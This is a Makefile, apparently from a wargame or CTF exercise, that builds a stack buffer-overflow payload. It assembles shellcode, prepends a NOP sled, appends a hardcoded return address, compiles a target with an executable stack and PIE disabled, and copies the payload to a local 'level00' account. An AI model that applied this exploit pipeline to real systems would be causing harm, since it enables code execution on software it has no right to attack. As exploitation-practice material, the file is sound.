ASM = payload.asm
OBJ = shellcode.o
ELF = shellcode
BIN = shellcode.bin
TEST = main.c
OUT = a.out
PAYLOAD = payload.bin
RET_ADDR = 00007fffffffe210

SHELL := /bin/bash

all: $(BIN) $(OUT) $(PAYLOAD)
	xxd $(PAYLOAD)

$(ELF): $(ASM)
	nasm -f elf64 $(ASM) -o $(OBJ)
	ld -m elf_x86_64 $(OBJ) -o $(ELF)
	rm -f $(OBJ)

$(BIN): $(ELF)
	objcopy -O binary -j .text $(ELF) $(BIN)

$(OUT): $(TEST)
	gcc $(TEST) -z execstack -no-pie -o $(OUT)

$(PAYLOAD): $(BIN)
	{ \
		printf '90%.0s' {1..50}; \
		xxd -p $(BIN) | tr -d '\n'; \
		echo -n $(RET_ADDR) | fold -w2 | tac | tr -d '\n'; \
	} | xxd -r -p > $(PAYLOAD)

copy: $(PAYLOAD)
	scp -P 4242 $(PAYLOAD) level00@localhost:/home/level00/payload.bin

clean:
	rm -f $(OBJ) $(ELF) $(BIN) $(OUT) $(PAYLOAD)

re: clean all

.PHONY: all clean re